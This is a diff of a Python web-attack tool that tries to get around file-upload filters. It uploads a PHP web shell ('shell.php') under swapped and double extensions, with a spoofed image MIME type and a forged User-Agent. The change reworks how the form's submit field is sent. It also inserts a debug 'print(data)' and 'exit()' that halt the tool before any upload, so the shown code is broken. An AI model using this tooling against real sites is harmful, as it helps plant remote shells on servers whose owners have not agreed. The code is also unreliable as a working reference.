@@ -125,20 +125,8 @@ def attributes(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brut
                 if "name" in j:
                     file_attr = j[j.find(start_name) + len(start_name):j.rfind(end_name)]
 
-        if 'submit' in i:
-            attribute = str(i)
-            attribute = attribute.split(" ")
-
-            for j in attribute:
-
-                if "name" in j:
-                    name = j[j.find(start_value) + len(start_value):j.rfind(end_value)]
-
-            attribute_dictionary = "{" + '"' + str(name) + '"' + ": " + '"' + "submit" + '"' + "}"
-            submit = json.loads(attribute_dictionary)
-            data.update(submit)
-
-    # print(data)
+    print(data)
+    exit()
     file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                    session, file_attr, data)
 
@@ -179,9 +167,8 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
             filename_ext = filename.replace("shell.php", f"shell{ext}")
             files = {
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
+                'submit': (None, 'submit')
             }
-
-            data.update(files)
 
             response = session.post(URL, files=files, headers=headers, data=data, proxies=proxies,
                                     allow_redirects=False, verify=TLS)
@@ -275,6 +262,7 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
         }
 
         load_cookies(session, "cookies.txt")
+
         response = session.post(URL, allow_redirects=False, data=data, files=files, headers={
             "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"},
                                 proxies=proxies, verify=TLS)
@@ -665,7 +653,6 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                     sys.exit(1)
 
     print("If everything fails, check if you need to login first and supply username and password!")
-
 
 def main():
     # Main function with all its arguments parsing
